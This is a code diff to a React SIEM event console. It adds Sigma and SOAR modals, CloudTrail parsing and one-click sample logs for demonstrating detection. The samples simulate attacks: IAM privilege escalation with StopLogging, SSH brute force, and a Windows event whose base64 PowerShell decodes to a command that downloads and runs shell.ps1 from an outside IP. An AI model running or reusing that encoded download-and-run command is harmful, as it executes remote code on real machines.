@@ -3,6 +3,8 @@ import { Shield, AlertTriangle, CheckCircle, Filter, RefreshCw, Zap, Clock, Acti
 import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid } from 'recharts';
 import { fetchSiemEvents, fetchMultiVectorCorrelation, connectLiveTelemetryStream, authFetch, escalateEventToIncident } from '../services/apiClient';
 import { useLanguage } from '../contexts/LanguageContext';
+import SigmaRulesModal from './SigmaRulesModal';
+import SoarActionModal from './SoarActionModal';
 
 const SEV_COLORS = { Critical: '#ef4444', High: '#f59e0b', Medium: '#06b6d4', Low: '#10b981', Info: '#64748b' };
 const SEV_BG = { Critical: 'bg-red-500/10 text-red-400 border-red-500/30', High: 'bg-amber-500/10 text-amber-400 border-amber-500/30', Medium: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30', Low: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30', Info: 'bg-slate-800 text-slate-400 border-slate-700' };
@@ -39,6 +41,8 @@ export default function SiemEventConsole() {
   const [showIngestModal, setShowIngestModal] = useState(false);
   const [rawLogInput, setRawLogInput] = useState('');
   const [ingestStatus, setIngestStatus] = useState('');
+  const [showSigmaModal, setShowSigmaModal] = useState(false);
+  const [soarModalData, setSoarModalData] = useState(null);
   const [wsStatus, setWsStatus] = useState(isZh ? '連線中…' : 'Connecting…');
   const [lastUpdate, setLastUpdate] = useState(new Date());
   const [escalatingId, setEscalatingId] = useState(null);
@@ -76,33 +80,55 @@ export default function SiemEventConsole() {
 
   const handleBulkIngest = async () => {
     if (!rawLogInput.trim()) return;
-    setIngestStatus(isZh ? '正在注入與正規化日誌…' : 'Ingesting and normalizing…');
+    setIngestStatus(isZh ? '正在執行正規化管線與 Sigma 規則掃描…' : 'Running normalization pipeline & Sigma detection...');
 
     try {
+      // 1. First attempt to route through enterprise ingest pipeline with Sigma YAML evaluation
+      const res = await authFetch('/api/ingest/logs', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ logText: rawLogInput.trim() })
+      });
+
+      const data = await res.json().catch(() => ({}));
+
+      if (res.ok) {
+        setIngestStatus(isZh
+          ? `成功注入！正規化 ${data.summary?.siemEventsCreated || 0} 條事件，觸發 ${data.summary?.sigmaHits || 0} 項 Sigma 告警！`
+          : `Ingested! Normalized ${data.summary?.siemEventsCreated || 0} events, triggered ${data.summary?.sigmaHits || 0} Sigma alerts!`);
+        fetchSiemEvents().then(d => { if (d?.events) setEvents(d.events); });
+        setTimeout(() => { setShowIngestModal(false); setIngestStatus(''); setRawLogInput(''); }, 1800);
+        return;
+      }
+
+      // 2. Fallback to basic bulk ingest if raw lines format
       const lines = rawLogInput.split('\n').filter(l => l.trim());
       const payloadEvents = lines.map((line, idx) => ({
-        sourceCategory: line.includes('Auditd') ? 'Linux_Auditd' : line.includes('Sysmon') ? 'Sysmon' : 'Windows_WEF',
+        sourceCategory: (line.includes('CloudTrail') || line.includes('iam.') || line.includes('awsRegion')) ? 'CloudTrail' : line.includes('Auditd') ? 'Linux_Auditd' : line.includes('Sysmon') ? 'Sysmon' : 'Windows_WEF',
         hostName: line.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/) ? line.match(/\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/)[0] : 'host-ingested-log',
-        severity: line.toLowerCase().includes('failed') || line.toLowerCase().includes('sudo') ? 'High' : 'Medium',
+        severity: line.toLowerCase().includes('failed') || line.toLowerCase().includes('sudo') || line.toLowerCase().includes('stoplogging') ? 'High' : 'Medium',
         eventId: `INGEST-${idx + 1}`,
         summary: line
       }));
 
-      const res = await authFetch('/api/siem/ingest/bulk', {
+      const fallbackRes = await authFetch('/api/siem/ingest/bulk', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ events: payloadEvents })
       });
 
-      if (res.ok) {
+      const fallbackData = await fallbackRes.json().catch(() => ({}));
+
+      if (fallbackRes.ok) {
         setIngestStatus(isZh ? `成功注入 ${lines.length} 條日誌事件！` : `Ingested ${lines.length} events!`);
         fetchSiemEvents().then(d => { if (d?.events) setEvents(d.events); });
         setTimeout(() => { setShowIngestModal(false); setIngestStatus(''); setRawLogInput(''); }, 1500);
       } else {
-        setIngestStatus(isZh ? '注入失敗' : 'Ingest failed');
+        const errorMsg = data.error || fallbackData.error || `HTTP ${fallbackRes.status}`;
+        setIngestStatus(isZh ? `注入失敗: ${errorMsg}` : `Ingest failed: ${errorMsg}`);
       }
     } catch (e) {
-      setIngestStatus(isZh ? '連線後端錯誤' : 'Error connecting to backend');
+      setIngestStatus(isZh ? `連線後端錯誤: ${e.message}` : `Error connecting to backend: ${e.message}`);
     }
   };
 
@@ -149,7 +175,21 @@ export default function SiemEventConsole() {
               : 'Centralized enterprise log aggregation — WEF, Sysmon, Auditd, Zeek, Wazuh, CloudTrail, Suricata, Defender.'}
           </p>
         </div>
-        <div className="flex items-center gap-2">
+        <div className="flex items-center gap-2 flex-wrap">
+          <button
+            onClick={() => setShowSigmaModal(true)}
+            className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-purple-500/20 hover:bg-purple-500/30 text-purple-300 border border-purple-500/40 font-mono text-xs font-bold transition-all"
+            title={isZh ? '檢視標準 Sigma YAML 偵測規則庫' : 'View Sigma YAML detection rules'}
+          >
+            📜 {isZh ? 'Sigma 規則庫' : 'Sigma Rules'}
+          </button>
+          <button
+            onClick={() => setSoarModalData({})}
+            className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/20 hover:bg-red-500/30 text-red-300 border border-red-500/40 font-mono text-xs font-bold transition-all"
+            title={isZh ? '開啟 SOAR 安全協同與自動應變處置器' : 'Open SOAR Action Orchestrator'}
+          >
+            ⚡ {isZh ? 'SOAR 自動應變' : 'SOAR Actions'}
+          </button>
           <button
             onClick={() => setShowIngestModal(true)}
             className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-mono text-xs font-bold transition-all shadow-md"
@@ -255,7 +295,7 @@ export default function SiemEventConsole() {
               </div>
               <div className="space-y-1.5 pt-1">
                 <div className="text-[11px] text-slate-400 font-semibold uppercase tracking-wider">
-                  {isZh ? 'SOC 分析師處置建議' : 'SOC Analyst Playbook'}
+                  {isZh ? 'SOC 分析師處置建議 (SOP)' : 'SOC Analyst Response SOP'}
                 </div>
                 {(correlation.socAnalystPlaybook || []).map((step, i) => (
                   <div key={i} className="flex items-start gap-2 text-xs text-slate-300 font-mono">
@@ -295,7 +335,7 @@ export default function SiemEventConsole() {
         </div>
         <div className="flex items-center gap-2 flex-wrap">
           <span className="text-xs font-mono text-slate-400">{isZh ? '日誌來源:' : 'Source:'}</span>
-          {['ALL', 'Windows_WEF', 'Sysmon', 'Linux_Auditd', 'Zeek', 'Wazuh', 'Suricata'].map(c => (
+          {['ALL', 'Windows_WEF', 'Sysmon', 'Linux_Auditd', 'Zeek', 'Wazuh', 'Suricata', 'CloudTrail'].map(c => (
             <button key={c} onClick={() => { setCatFilter(c); setCurrentPage(1); }}
               className={`px-2 py-0.5 rounded text-[10px] font-mono font-semibold transition-all ${catFilter === c ? 'bg-purple-500/20 text-purple-300 border border-purple-500/30' : 'bg-slate-900 text-slate-400 border border-slate-800 hover:text-white'}`}>
               {c === 'ALL' ? t('common.all', 'ALL') : c.replace('_', ' ')}
@@ -341,7 +381,24 @@ export default function SiemEventConsole() {
               <div className="text-[10px] text-slate-500 font-mono flex items-center gap-1">
                 <Shield className="w-3 h-3 text-slate-600" /> MITRE: {event.mitreTechnique}
               </div>
-              <div>
+              <div className="flex items-center gap-2">
+                <button
+                  onClick={() => {
+                    const ipMatch = event.summary?.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/);
+                    const foundIp = event.rawDetails?.originalEvent?.ip || event.rawDetails?.originalEvent?.srcIp || (ipMatch ? ipMatch[0] : null) || event.hostName?.split('.')[0] || '198.51.100.42';
+                    setSoarModalData({
+                      ip: foundIp,
+                      summary: event.summary,
+                      severity: event.severity,
+                      mitreTechnique: event.mitreTechnique,
+                      incidentId: escalatedMap[event.id || event.eventId || event.summary] || undefined
+                    });
+                  }}
+                  className="inline-flex items-center gap-1 text-[10px] font-mono font-bold px-2 py-0.5 rounded border bg-red-500/15 text-red-300 border-red-500/30 hover:bg-red-500/25 transition-all"
+                  title={isZh ? '觸發 SOAR 自動化應變處置 (阻擋 IP / 發送告警 Webhook)' : 'Trigger SOAR action (Block IP / Send Webhook)'}
+                >
+                  ⚡ {isZh ? 'SOAR 應變' : 'SOAR'}
+                </button>
                 {escalatedMap[event.id || event.eventId || event.summary] ? (
                   <span className="inline-flex items-center gap-1 text-[10px] font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                     <Check className="w-3 h-3" /> {isZh ? `已成案 ${escalatedMap[event.id || event.eventId || event.summary]}` : `Escalated (${escalatedMap[event.id || event.eventId || event.summary]})`}
@@ -427,9 +484,68 @@ export default function SiemEventConsole() {
             </h3>
             <p className="text-xs text-slate-400 font-mono">
               {isZh
-                ? '請在下方貼上原始 Syslog / WEF 日誌行。後端正規化管線將自動擷取 IP、風險等級與對齊 MITRE ATT&CK 戰術手法。'
-                : 'Paste raw syslog / WEF lines below. The backend normalization pipeline will extract IPs, severity, and MITRE ATT&CK techniques automatically.'}
+                ? '請在下方貼上原始 Syslog / WEF / CloudTrail JSON 日誌。後端正規化管線將自動分類、提取 IoC 並執行 Sigma YAML 規則掃描。'
+                : 'Paste raw Syslog / WEF / CloudTrail JSON logs below. The backend pipeline normalizes telemetry, extracts IoCs, and triggers Sigma YAML detection rules.'}
             </p>
+
+            {/* Quick Sample Selector */}
+            <div className="space-y-1.5">
+              <div className="text-[11px] font-mono text-slate-400 font-semibold flex items-center justify-between">
+                <span>{isZh ? '面試快速驗證範例 (One-Click Sample Payloads):' : 'One-Click Interview Sample Payloads:'}</span>
+              </div>
+              <div className="grid grid-cols-3 gap-2">
+                <button
+                  type="button"
+                  onClick={() => setRawLogInput(JSON.stringify({
+                    Records: [
+                      {
+                        eventVersion: "1.08",
+                        eventTime: new Date().toISOString(),
+                        eventSource: "iam.amazonaws.com",
+                        eventName: "AttachRolePolicy",
+                        awsRegion: "us-east-1",
+                        sourceIPAddress: "185.220.101.5",
+                        userAgent: "aws-cli/2.15.0",
+                        requestParameters: {
+                          roleName: "AdminRole",
+                          policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"
+                        }
+                      },
+                      {
+                        eventVersion: "1.08",
+                        eventTime: new Date().toISOString(),
+                        eventSource: "cloudtrail.amazonaws.com",
+                        eventName: "StopLogging",
+                        awsRegion: "us-east-1",
+                        sourceIPAddress: "185.220.101.5",
+                        userAgent: "aws-cli/2.15.0"
+                      }
+                    ]
+                  }, null, 2))}
+                  className="px-2.5 py-1.5 rounded-lg bg-amber-500/10 border border-amber-500/30 hover:bg-amber-500/20 text-amber-300 text-[11px] font-mono text-left transition-all"
+                >
+                  ☁️ {isZh ? 'AWS CloudTrail' : 'AWS CloudTrail'}
+                  <span className="block text-[9px] text-slate-400">IAM 提權 & 防禦規避</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setRawLogInput(`Jul 28 03:12:01 edge-gateway-01 sshd[14522]: Failed password for invalid user root from 185.220.101.5 port 44821 ssh2\nJul 28 03:12:03 edge-gateway-01 sshd[14523]: Failed password for invalid user admin from 185.220.101.5 port 44822 ssh2\nJul 28 03:12:05 edge-gateway-01 sshd[14524]: Failed password for root from 185.220.101.5 port 44823 ssh2`)}
+                  className="px-2.5 py-1.5 rounded-lg bg-cyan-500/10 border border-cyan-500/30 hover:bg-cyan-500/20 text-cyan-300 text-[11px] font-mono text-left transition-all"
+                >
+                  🐧 {isZh ? 'Linux Syslog' : 'Linux Syslog'}
+                  <span className="block text-[9px] text-slate-400">SSHD 密碼暴力破解</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setRawLogInput(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID><Computer>DC-SRV-01.corp.internal</Computer><TimeCreated SystemTime="${new Date().toISOString()}"/></System><EventData><Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=</Data></EventData></Event>`)}
+                  className="px-2.5 py-1.5 rounded-lg bg-purple-500/10 border border-purple-500/30 hover:bg-purple-500/20 text-purple-300 text-[11px] font-mono text-left transition-all"
+                >
+                  🪟 {isZh ? 'Windows WEF' : 'Windows WEF'}
+                  <span className="block text-[9px] text-slate-400">混淆 PowerShell (4688)</span>
+                </button>
+              </div>
+            </div>
+
             <textarea
               rows={6}
               value={rawLogInput}
@@ -445,6 +561,19 @@ export default function SiemEventConsole() {
           </div>
         </div>
       )}
+
+      {/* Sigma Detection Rules Modal (Detection-as-Code) */}
+      <SigmaRulesModal
+        isOpen={showSigmaModal}
+        onClose={() => setShowSigmaModal(false)}
+      />
+
+      {/* SOAR Automated Response Modal */}
+      <SoarActionModal
+        isOpen={!!soarModalData}
+        initialData={soarModalData || {}}
+        onClose={() => setSoarModalData(null)}
+      />
     </div>
   );
 }
